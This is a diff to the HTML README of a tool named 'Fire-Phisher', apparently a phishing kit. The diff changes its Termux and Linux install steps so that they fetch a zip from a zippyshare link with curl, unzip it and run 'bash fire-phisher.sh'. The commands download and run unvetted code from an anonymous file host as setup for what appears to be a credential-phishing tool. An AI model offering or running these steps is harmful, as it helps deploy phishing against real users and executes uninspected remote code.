@@ -3,15 +3,15 @@
 <hr>
 <h2 align="center"> Installation Commands [Termux]
 </h2>
-<p align="center">pkg install wget figlet php -y </p> <br> 
-<p align="center">wget https://github.com/Kum4r-Princ3/Fire-Phisher/blob/main/Fire-Phisher.zip </p> <br> 
+<p align="center">pkg install curl figlet php -y </p> <br> 
+<p align="center">curl -LO https://www14.zippyshare.com/d/OzY4yBYD/4234/Fire-Phisher.zip </p> <br> 
 <p align="center">unzip Fire-Phisher.zip </p> <br> 
 <p align="center">cd Fire-Phisher </p> <br> 
 <p align="center">bash fire-phisher.sh </p>
 <hr>
 <h2 align="center"> Installation Commands [Linux]</h2>
-<p align="center">sudo apt install wget figlet php -y </p> <br> 
-<p align="center">wget https://github.com/Kum4r-Princ3/Fire-Phisher/blob/main/Fire-Phisher.zip </p> <br> 
+<p align="center">sudo apt install curl figlet php -y </p> <br> 
+<p align="center">curl -LO https://www14.zippyshare.com/d/OzY4yBYD/4234/Fire-Phisher.zip</p> <br> 
 <p align="center">unzip Fire-Phisher.zip </p> <br> 
 <p align="center">cd Fire-Phisher </p> <br> 
 <p align="center">bash fire-phisher.sh </p>
